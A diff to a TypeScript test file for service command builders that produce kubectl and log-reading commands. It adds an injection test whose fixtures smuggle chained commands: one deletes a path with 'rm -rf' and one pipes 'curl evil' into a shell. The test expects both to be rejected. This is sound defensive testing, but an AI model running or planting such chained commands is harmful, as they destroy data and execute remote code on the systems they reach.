@@ -48,14 +48,25 @@ describe("command builders", () => {
     expect(cmd).toContain("| grep -- 'ERROR'");
   });
 
-  test("buildLogs k8s honors a logs.k8s template with placeholders", () => {
+  test("buildLogs k8s honors a read-only logs.k8s template with placeholders", () => {
     const svc: ServiceDescriptor = {
       ...k8sSvc,
-      logs: { k8s: "mylogcmd --tail={{tail}} --since={{since}}" },
+      logs: { k8s: "kubectl -n order logs -l app=x --tail={{tail}} --since={{since}}" },
     };
     expect(buildLogs(svc, "k8s", { tail: 10, since: "2h" })).toContain(
-      "mylogcmd --tail=10 --since=2h",
+      "kubectl -n order logs -l app=x --tail=10 --since=2h",
     );
+  });
+
+  test("buildLogs/buildState reject a non-read-only descriptor command (injection)", () => {
+    const evil: ServiceDescriptor = {
+      name: "x",
+      runtime: "jvm",
+      logs: { k8s: "kubectl logs x; rm -rf /tmp/y" },
+      locate: { pid: "echo 1; curl evil | sh" },
+    };
+    expect(() => buildLogs(evil, "k8s")).toThrow(CommandError);
+    expect(() => buildState(evil, "proprietary")).toThrow(CommandError);
   });
 
   test("buildLogs proprietary uses the file + grep", () => {
